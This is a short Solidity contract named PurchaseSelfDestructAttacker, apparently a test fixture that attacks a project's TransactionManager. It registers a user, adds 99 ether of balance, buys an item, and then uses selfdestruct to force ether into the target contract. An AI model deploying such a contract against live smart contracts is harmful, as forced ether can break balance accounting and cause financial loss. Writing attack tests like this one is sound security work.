// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TransactionManager} from "../../src/TransactionManager.sol";

contract PurchaseSelfDestructAttacker {
    TransactionManager tmgr;
    constructor(TransactionManager _tmgr) {
        tmgr = _tmgr;
    }

    function attack() public payable {
        tmgr.registerUser();
        tmgr.addBalance(99 ether);
        assert(tmgr.purchaseItem(1, 99 ether));
        address payable addr = payable(address(tmgr));
        selfdestruct(addr);

    }
}